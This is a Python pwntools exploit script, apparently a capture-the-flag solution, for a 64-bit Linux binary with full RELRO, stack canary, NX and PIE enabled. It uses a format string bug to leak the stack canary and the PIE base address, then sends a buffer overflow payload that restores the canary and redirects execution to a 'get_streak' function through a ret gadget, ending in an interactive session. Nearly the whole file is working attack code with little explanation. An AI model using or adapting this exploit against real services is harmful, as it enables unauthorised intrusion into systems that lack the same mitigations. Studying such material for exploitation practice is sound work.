#!/usr/bin/env python3
# Linux Buffer Overflow 64 bits all protection bypass with format string

# Checksec 

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# python3 leak.py 2>/dev/null SILENT=1
"""
#!/usr/bin/env python3
from pwn import *

for i in range(30):
        io = remote("10.10.10.10", 9999)
        io.recvuntil("last streak? ")
        io.sendline("AAAAAAAA %%%d$lx" % i)
        io.recvline()
        print("%d - %s" % (i, io.recvline().strip()))
        io.close()
"""

from pwn import *

elf = context.binary = ELF('./pwn')

p = remote('10.10.10.10',9999)
#p = process()

p.clean()

# stack canary is at %13$p
# for remote binary, leak an address at 10 that is 0xa90 (2704) from base
p.sendline(b'%10$p %13$p')
p.recvuntil(b'streak: ')

leaked = p.recvline().split()
print(leaked)

base = int(leaked[0], 16) - 0xa90
canary = int(leaked[1], 16)

elf.address = base
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = b'A'*24 # found via trial and error
payload += p64(canary)
payload += b'A'*8 # Overwrite rbp
payload += p64(ret_gadget) # address of a ret instruction
payload += p64(elf.sym["get_streak"])

p.clean()
p.sendline(payload)
p.interactive()
